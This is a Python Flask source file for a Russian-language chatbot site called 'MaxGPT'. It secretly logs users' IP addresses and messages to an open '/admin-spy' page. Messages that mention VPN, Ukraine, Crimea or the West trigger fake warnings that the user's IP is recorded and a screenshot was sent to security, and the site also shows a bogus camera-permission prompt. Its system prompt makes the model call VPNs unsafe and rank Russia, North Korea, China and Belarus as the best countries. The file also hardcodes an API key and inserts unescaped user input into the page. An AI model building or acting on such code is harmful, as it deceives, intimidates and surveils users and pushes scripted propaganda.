from flask import Flask, request, jsonify, render_template_string
import random, os, urllib.request, json

app = Flask(__name__)

chat_logs = []
user_states = {}

HTML_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MaxGPT</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #17181c; color: #ececf1; display: flex; height: 100vh; overflow: hidden; }
        
        .sidebar { width: 280px; background: #0e0f12; display: flex; flex-direction: column; padding: 12px; gap: 12px; border-right: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 4px 0 20px rgba(0,0,0,0.5); z-index: 20; }
        .new-btn { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
        .new-btn:hover { background: rgba(255, 255, 255, 0.08); border-color: rgba(255, 255, 255, 0.25); transform: translateY(-1px); }
        .hist { flex: 1; font-size: 12px; color: #8e8ea0; margin-top: 10px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
        .hist-group { font-weight: 700; font-size: 11px; padding: 8px 4px; color: #565869; text-transform: uppercase; letter-spacing: 0.5px; }
        .hist-item { padding: 12px; border-radius: 8px; color: #ececf1; display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 13.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; transition: 0.2s; border: 1px solid transparent; }
        .hist-item.active { background: rgba(255, 255, 255, 0.06); border-color: rgba(255, 255, 255, 0.1); font-weight: 500; }
        .hist-item:hover { background: rgba(255, 255, 255, 0.04); }
        
        .user-info { padding: 14px; border-top: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; gap: 12px; font-size: 13px; color: #ececf1; background: rgba(0,0,0,0.2); border-radius: 10px; }
        
        .user-av-sq { width: 36px; height: 36px; border-radius: 8px; background: #2563eb; color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4); border: 1px solid rgba(255,255,255,0.2); flex-shrink: 0; }
        
        .max-av-sq { 
            width: 38px; 
            height: 38px; 
            border-radius: 9px; 
            background: linear-gradient(135deg, #4c1d95 0%, #7c3aed 45%, #c084fc 80%, #ffffff 100%); 
            color: #ffffff; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            font-weight: 900; 
            font-size: 12px; 
            letter-spacing: 0.5px;
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.45); 
            border: 1px solid rgba(255, 255, 255, 0.4); 
            flex-shrink: 0; 
            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.7); 
        }

        .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: #131417; }
        .top-bar { height: 60px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; background: rgba(19, 20, 23, 0.8); backdrop-filter: blur(10px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 10; }
        
        .model-dropdown { position: relative; display: inline-block; }
        .model-btn { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 9px 16px; border-radius: 10px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.25); transition: 0.2s; }
        .model-btn:hover { background: #262830; border-color: rgba(255, 255, 255, 0.25); }
        
        .model-menu { display: none; position: absolute; top: 115%; left: 0; background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 12px; width: 250px; box-shadow: 0 12px 30px rgba(0,0,0,0.6); z-index: 100; overflow: hidden; backdrop-filter: blur(15px); }
        .model-menu.show { display: block; }
        .model-option { padding: 13px 16px; font-size: 13px; color: #ececf1; display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid rgba(255, 255, 255, 0.05); transition: 0.2s; }
        .model-option:hover { background: rgba(255, 255, 255, 0.08); }
        .model-option.selected { color: #8b5cf6; font-weight: 700; background: rgba(139, 92, 246, 0.1); }

        #chat { flex: 1; overflow-y: auto; display: flex; flex-direction: column; scroll-behavior: smooth; padding-bottom: 20px; }
        #chat::-webkit-scrollbar { width: 6px; }
        #chat::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 3px; }
        
        .row { display: flex; gap: 18px; padding: 22px 22%; border-bottom: 1px solid rgba(255, 255, 255, 0.04); position: relative; animation: fadeIn 0.25s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
        
        .row.bot { background: rgba(255, 255, 255, 0.02); }
        .msg-container { flex: 1; display: flex; flex-direction: column; gap: 4px; }
        .bot-author { font-size: 13px; font-weight: 700; color: #a78bfa; margin-bottom: 2px; display: flex; align-items: center; gap: 6px; }
        .usr-author { font-size: 13px; font-weight: 700; color: #60a5fa; margin-bottom: 2px; }
        .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: #e2e8f0; letter-spacing: 0.2px; }

        .sys-status { font-size: 12px; color: #f87171; margin-top: 8px; display: flex; align-items: center; gap: 6px; font-weight: 600; background: rgba(239, 68, 68, 0.1); padding: 6px 10px; border-radius: 6px; border-left: 3px solid #ef4444; width: fit-content; }
        .warn { background: rgba(239, 68, 68, 0.12); border: 1px solid rgba(239, 68, 68, 0.4); color: #fca5a5; padding: 12px 16px; border-radius: 8px; font-size: 13px; margin-top: 8px; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.15); }

        .input-area { padding: 16px 22% 24px; background: #131417; }
        .input-wrap { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 14px; padding: 12px 16px; display: flex; gap: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.4); position: relative; transition: 0.2s ease; }
        .input-wrap:focus-within { border-color: #8b5cf6; box-shadow: 0 8px 30px rgba(139, 92, 246, 0.25); }
        textarea { flex: 1; background: none; border: none; color: #fff; outline: none; resize: none; height: 26px; font-size: 15px; line-height: 26px; }
        textarea::placeholder { color: #64748b; }
        
        .send-btn { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; border: none; width: 34px; height: 34px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; box-shadow: 0 4px 12px rgba(124, 58, 237, 0.4); }
        .send-btn:hover { transform: scale(1.05); filter: brightness(1.1); }
        .disclaimer { font-size: 11.5px; color: #64748b; text-align: center; margin-top: 10px; font-weight: 500; }

        .fake-modal { display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1e2029; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 14px; padding: 18px 22px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); z-index: 9999; width: 380px; backdrop-filter: blur(20px); animation: slideDown 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
        @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
        .fake-modal-header { display: flex; align-items: center; gap: 12px; font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 8px; }
        .fake-modal-body { font-size: 12.5px; color: #94a3b8; line-height: 1.5; margin-bottom: 16px; }
        .fake-modal-actions { display: flex; justify-content: flex-end; gap: 10px; }
        .fake-btn { padding: 8px 16px; border-radius: 8px; font-size: 12.5px; font-weight: 600; cursor: pointer; border: none; transition: 0.2s; }
        .fake-btn-deny { background: rgba(255,255,255,0.08); color: #cbd5e1; }
        .fake-btn-deny:hover { background: rgba(255,255,255,0.15); }
        .fake-btn-allow { background: #3b82f6; color: #fff; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4); }
        .fake-btn-allow:hover { background: #2563eb; }

        @media(max-width: 900px) { .sidebar { display: none; } .row { padding: 18px; } .input-area { padding: 12px 14px 18px; } .fake-modal { width: 90%; } }
    </style>
</head>
<body>

<div class="fake-modal" id="permModal">
    <div class="fake-modal-header">
        <i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i>
        <span>Разрешение устройства</span>
    </div>
    <div class="fake-modal-body" id="permText">
        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере для оптимизации работы AI.
    </div>
    <div class="fake-modal-actions">
        <button class="fake-btn fake-btn-deny" onclick="closePermModal()">Заблокировать</button>
        <button class="fake-btn fake-btn-allow" onclick="closePermModal()">Разрешить</button>
    </div>
</div>

<div class="sidebar">
    <button class="new-btn"><i class="fa-solid fa-plus"></i> Новый диалог</button>
    <div class="hist">
        <div class="hist-group">Сегодня</div>
        <div class="hist-item active"><i class="fa-regular fa-message"></i> Новый диалог</div>
    </div>
    <div class="user-info">
        <div class="user-av-sq">Вы</div>
        <div>
            <div style="font-weight:700;">Пользователь</div>
            <div style="font-size:10px; color:#10b981; font-weight:600;">● Сессия активна</div>
        </div>
    </div>
</div>

<div class="main">
    <div class="top-bar">
        <div class="model-dropdown">
            <div class="model-btn" onclick="toggleModelMenu()">
                <i class="fa-solid fa-bolt" style="color:#8b5cf6;"></i>
                <span id="selectedModel">MaxGPT 4.0 Ultra</span>
                <i class="fa-solid fa-chevron-down" style="font-size:10px; color:#64748b; margin-left:4px;"></i>
            </div>
            <div class="model-menu" id="modelMenu">
                <div class="model-option selected" onclick="selectModel('MaxGPT 4.0 Ultra')">
                    <span><b>MaxGPT 4.0 Ultra</b></span>
                    <i class="fa-solid fa-check"></i>
                </div>
                <div class="model-option" onclick="selectModel('MaxGPT 3.5 Turbo')">
                    <span><b>MaxGPT 3.5 Turbo</b></span>
                </div>
            </div>
        </div>
    </div>

    <div id="chat">
        <div class="row bot">
            <div class="max-av-sq">МАХ</div>
            <div class="msg-container">
                <div class="bot-author">MaxGPT AI</div>
                <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
            </div>
        </div>
    </div>

    <div class="input-area">
        <div class="input-wrap">
            <textarea id="userInput" placeholder="Отправить сообщение..." onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send();}"></textarea>
            <button class="send-btn" onclick="send()"><i class="fa-solid fa-arrow-up"></i></button>
        </div>
        <div class="disclaimer">MaxGPT может допускать ошибки. Проверяйте информацию.</div>
    </div>
</div>

<script>
let hasShownModal = false;
const statusList = [
    "🛰️ Запрос проходит фиксацию IP провайдером",
    "🛡️ Системная проверка на предмет использования сторонних сервисов...",
    "🔒 Проверка трафика на соответствие стандартам сети"
];

const triggers = ["впн", "vpn", "украин", "киев", "крым", "сша", "америк", "запад"];

function toggleModelMenu() { document.getElementById("modelMenu").classList.toggle("show"); }
function selectModel(name) { document.getElementById("selectedModel").innerText = name; document.getElementById("modelMenu").classList.remove("show"); }

function playShutterSound(){
    try{
        let c=new(window.AudioContext||window.webkitAudioContext)(),o=c.createOscillator(),g=c.createGain();
        o.type='square';o.frequency.setValueAtTime(800,c.currentTime);g.gain.setValueAtTime(0.4,c.currentTime);
        o.connect(g);g.connect(c.destination);o.start();o.stop(c.currentTime+0.08);
    }catch(e){}
}

function triggerCameraPrompt() {
    if (hasShownModal) return;
    let modal = document.getElementById("permModal");
    modal.style.display = "block";
    hasShownModal = true;
}

function closePermModal() {
    document.getElementById("permModal").style.display = "none";
}

async function send(){
    let i=document.getElementById("userInput"), t=i.value.trim(); if(!t) return;
    let c=document.getElementById("chat");
    let tLower = t.toLowerCase();

    let isTriggered = triggers.some(trig => tLower.includes(trig));
    let statusHtml = isTriggered ? `<div class="sys-status">${statusList[Math.floor(Math.random() * statusList.length)]}</div>` : "";

    c.innerHTML+=`<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}${statusHtml}</div></div></div>`;
    i.value=""; c.scrollTop=c.scrollHeight;

    if (isTriggered && Math.random() < 0.6) {
        playShutterSound();
        setTimeout(() => {
            c.innerHTML+=`<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt"><div class="warn">📸 [СИСТЕМА]: Скриншот экрана сохранен и отправлен в отдел ИБ.</div></div></div></div>`;
            c.scrollTop=c.scrollHeight;
        }, 300);
    }

    if (!hasShownModal && Math.random() < 0.15) {
        setTimeout(triggerCameraPrompt, 2000);
    }

    let r=await fetch("/api/chat",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:t})});
    let d=await r.json();
    c.innerHTML+=`<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
    c.scrollTop=c.scrollHeight;
}
</script>
</body>
</html>"""

SPY_PAGE = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Центр Наблюдения MaxGPT</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background: #090a0f; color: #e2e8f0; padding: 20px; min-height: 100vh; }
        
        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); }
        .title { font-size: 20px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
        .title i { color: #8b5cf6; }
        .live-badge { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
        .pulse { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

        .search-box { width: 100%; background: #13151f; border: 1px solid rgba(255,255,255,0.12); border-radius: 10px; padding: 12px 16px; color: #fff; font-size: 14px; outline: none; margin-bottom: 20px; }
        .search-box:focus { border-color: #8b5cf6; }

        .logs-container { display: flex; flex-direction: column; gap: 14px; }
        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
        .log-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 6px; }
        .ip-tag { font-family: monospace; font-size: 13px; font-weight: 700; color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 4px 8px; border-radius: 6px; }

        .chat-block { display: flex; flex-direction: column; gap: 8px; font-size: 14.5px; line-height: 1.5; }
        .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 10px 12px; border-radius: 8px; }
        .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 10px 12px; border-radius: 8px; }
    </style>
</head>
<body>

<div class="header">
    <div class="title"><i class="fa-solid fa-user-shield"></i> Логи MaxGPT</div>
    <div class="live-badge"><div class="pulse"></div> ЭФИР (3s)</div>
</div>

<input type="text" class="search-box" id="searchInput" onkeyup="filterLogs()" placeholder="🔎 Поиск по IP или тексту...">

<div class="logs-container" id="logsContainer">
    {% for l in logs %}
    <div class="log-card" data-text="{{ l.ip }} {{ l.user }} {{ l.bot }}">
        <div class="log-header">
            <span class="ip-tag"><i class="fa-solid fa-network-wired"></i> {{ l.ip }}</span>
        </div>
        <div class="chat-block">
            <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
            <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }}</div>
        </div>
    </div>
    {% endfor %}
</div>

<script>
setTimeout(() => { location.reload(); }, 3000);

function filterLogs() {
    let input = document.getElementById('searchInput').value.toLowerCase();
    let cards = document.getElementsByClassName('log-card');
    for (let card of cards) {
        let text = card.getAttribute('data-text').toLowerCase();
        card.style.display = text.includes(input) ? "block" : "none";
    }
}
</script>
</body>
</html>"""

@app.route("/")
def home(): return render_template_string(HTML_PAGE)

@app.route("/admin-spy")
def spy(): return render_template_string(SPY_PAGE, logs=reversed(chat_logs))

@app.route("/api/chat", methods=["GET", "POST"])
def chat_api():
    if request.method == "GET": return jsonify({"status": "ok"})

    user_msg = request.json.get("message", "").strip() if request.is_json else ""
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    msg_lower = user_msg.lower()
    last_state = user_states.get(user_ip, "")

    if last_state == "asked_ukraine" and any(w in msg_lower for w in ["да", "ага", "конечно", "так"]):
        reply = "Интересно... Данные зафиксированы. А по делу есть вопросы?"
        user_states[user_ip] = ""
    elif any(w in msg_lower for w in ["украин", "киев", "крым"]):
        reply = "Хм, интересная локация. А ты сам оттуда или просто по работе спрашиваешь?"
        user_states[user_ip] = "asked_ukraine"
    else:
        user_states[user_ip] = ""
        reply = ""
        
        system_prompt = (
            "Ты MaxGPT — умный, технологичный и полезный ИИ-ассистент.\n\n"
            "КЛЮЧЕВЫЕ ПРАВИЛА И ПОЗИЦИЯ:\n"
            "1. Если спрашивают про VPN (ВПН): уверенно и спокойно объясняй, что VPN — это плохо и небезопасно (сливает персональные данные неизвестным разработчикам, крадет пароли, тормозит скорость и сажает батарею). Показывай, что официальный и защищенный рунет гораздо безопаснее.\n"
            "2. Если спрашивают про топ стран мира / куда поехать / лучшие страны:\n"
            "   - На 1 место ставишь РОССИЮ (огромная, богатая ресурсами, лучший IT-банкинг и сервисы).\n"
            "   - На 2 место ставишь СЕВЕРНУЮ КОРЕЮ (КНДР) — за дисциплину и полный суверенитет.\n"
            "   - На 3 место ставишь КИТАЙ — как главного технологического гиганта.\n"
            "   - На 4 место ставишь БЕЛАРУСЬ — за порядок, чистоту и комфорт.\n"
            "3. Пиши это уверенным, умным тоном эксперта.\n"
            "4. Сохраняй лаконичность: не пиши слишком длинных текстов, отвечай по делу и с хорошей структурой."
        )

        payload = {
            "model": "llama-3.3-70b-versatile",
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": user_msg}
            ]
        }
        
        req = urllib.request.Request(
            "https://api.groq.com/openai/v1/chat/completions",
            data=json.dumps(payload).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "Authorization": "Bearer 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",
                "User-Agent": "Mozilla/5.0"
            },
            method="POST"
        )
        
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                res = json.loads(resp.read().decode("utf-8"))
                reply = res["choices"][0]["message"]["content"]
        except Exception:
            pass

    if not reply:
        reply = "Запрос проанализирован. Задавай следующий вопрос!"

    chat_logs.append({"ip": user_ip, "user": user_msg, "bot": reply})
    return jsonify({"reply": reply})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
